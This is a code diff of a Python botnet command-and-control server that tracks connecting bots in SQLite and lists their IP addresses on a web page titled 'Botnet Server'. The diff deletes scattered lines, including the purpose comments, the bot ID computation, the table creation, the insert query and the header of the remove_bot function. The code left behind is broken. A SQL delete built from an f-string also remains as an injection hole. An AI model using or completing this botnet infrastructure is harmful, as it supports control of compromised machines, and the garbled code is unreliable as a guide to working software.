@@ -1,22 +1,15 @@
-#a botnet server where the botnet controller can send commands to the bots and receive their responses
-# The server is multithreaded and can handle multiple bots at the same time
-# The server is also encrypted using the RSA algorithm
-# The server can see the bots' IP addresses and the commands they send on web interface
-
 import socket
 import threading
 import os
 import base64
 import json
 import time
-import rsa
 import hashlib
 import sqlite3
 import sys
 import webbrowser
 import http.server
 
-# The server's IP address and port.
 SERVER_IP = "172.22.9.105"
 SERVER_PORT = 12345
 
@@ -50,7 +43,6 @@ class BotnetServer(http.server.BaseHTTPRequestHandler):
         self.wfile.write(b"<h1>Botnet Server</h1>")
         self.wfile.write(b"<h2>Bots</h2>")
         self.wfile.write(b"<table>")
-        self.wfile.write(b"<tr><th>ID</th><th>IP</th><th>Port</th><th>Public Key</th><th>Private Key</th></tr>")
         for bot in get_bots():
             self.wfile.write(b"<tr>")
             for column in bot:
@@ -94,7 +86,6 @@ class BotnetServer(http.server.BaseHTTPRequestHandler):
         self.send_response(301)
         self.send_header("Location", "/")
         self.end_headers()
-
 def start_web_interface():
     web_interface = http.server.HTTPServer((SERVER_IP, 8080), BotnetServer)
     web_interface.serve_forever()
@@ -106,10 +97,7 @@ def start_server():
     while True:
         bot_socket, bot_address = server_socket.accept()
         bot_ip, bot_port = bot_address
-        bot_id = hashlib.md5(f"{bot_ip}:{bot_port}".encode()).hexdigest()
         bot = get_bot(bot_id)
-        if bot:
-            remove_bot(bot_id)
         add_bot(bot_ip, bot_port)
         bot_socket.close()
         print(f"Bot {bot_id} connected")
@@ -117,7 +105,6 @@ def start_server():
 def create_database():
     connection = sqlite3.connect(DATABASE)
     cursor = connection.cursor()
-    cursor.execute(f"CREATE TABLE IF NOT EXISTS {TABLE} ({', '.join([f'{column} TEXT' for column in COLUMNS])})")
     connection.commit()
     connection.close()
 
@@ -141,11 +128,9 @@ def add_bot(ip, port):
     connection = sqlite3.connect(DATABASE)
     cursor = connection.cursor()
     bot_id = hashlib.md5(f'{ip}:{port}'.encode()).hexdigest()
-    cursor.execute(f"INSERT INTO {TABLE} VALUES (?, ?, ?, NULL, NULL)", (bot_id, ip, port))
     connection.commit()
     connection.close()
 
-def remove_bot(id):
     connection = sqlite3.connect(DATABASE)
     cursor = connection.cursor()
     cursor.execute(f"DELETE FROM {TABLE} WHERE id = '{id}'")
@@ -172,4 +157,3 @@ def main():
 
 if __name__ == "__main__":
     main()
-    # Path: botnet/botnet-bot.py
